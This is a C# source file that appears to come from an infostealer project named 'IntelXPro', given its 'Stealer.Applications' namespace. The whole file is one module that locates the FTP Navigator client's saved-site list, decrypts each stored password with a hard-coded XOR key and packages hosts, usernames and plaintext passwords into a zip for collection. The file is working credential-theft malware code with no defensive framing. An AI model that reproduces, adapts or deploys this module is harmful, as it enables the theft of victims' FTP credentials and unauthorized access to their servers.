using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.Encryption;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class FTPNavigator : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = "C:\\FTP Navigator\\Ftplist.txt";
            if (!File.Exists(text))
            {
                return;
            }
            string[] array = File.ReadAllLines(text);
            List<string> list = new List<string>();
            Counter.CounterApplications counterApplications = new Counter.CounterApplications
            {
                Name = "FTP Navigator"
            };
            string[] array2 = array;
            foreach (string text2 in array2)
            {
                if (!string.IsNullOrWhiteSpace(text2))
                {
                    string[] array3 = text2.Split(';');
                    string text3 = array3[1].Split('=')[1];
                    string text4 = array3[2].Split('=')[1];
                    string input = array3[3].Split('=')[1];
                    string text5 = array3[4].Split('=')[1];
                    if (!(array3[5].Split('=')[1] != "0"))
                    {
                        string text6 = Xor.DecryptString(input, 25);
                        list.Add("Url: " + text3 + ":" + (string.IsNullOrEmpty(text4) ? "21" : text4) + "\nUsername: " + text5 + "\nPassword: " + text6 + "\n");
                        counterApplications.Files.Add(text + " => FTP Navigator\\Hosts.txt");
                    }
                }
            }
            if (list.Count > 0)
            {
                string text7 = "FTP Navigator\\Hosts.txt";
                zip.AddFile(text7, Encoding.UTF8.GetBytes(string.Join("\n", list)));
                counterApplications.Files.Add(text7);
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
